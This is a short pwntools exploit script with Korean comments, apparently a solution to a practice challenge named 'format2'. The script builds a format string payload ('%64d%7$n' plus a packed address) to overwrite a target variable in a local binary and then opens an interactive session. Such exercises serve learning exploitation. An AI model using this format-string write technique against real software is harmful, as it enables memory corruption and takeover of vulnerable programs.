from pwn import *

# pwntools 라이브러리 임포트
p = process('./format2')

# target 변수의 주소 저장
target = 0x40404c

# 포맷 스트링 공격을 위한 페이로드 구성
# %64d: 64바이트의 공백을 출력하여 %n이 64를 쓰도록 함
# %7$n: 7번째 인자(스택의 target 주소)에 지금까지 출력된 문자 수(64)를 씀
payload = b'%64d%7$n'

# target 변수의 주소를 리틀 엔디안으로 패킹하여 추가
payload += p64(target)

# 페이로드 전송
p.sendline(payload)

# 익스플로잇 후 대화형 세션 시작
p.interactive()
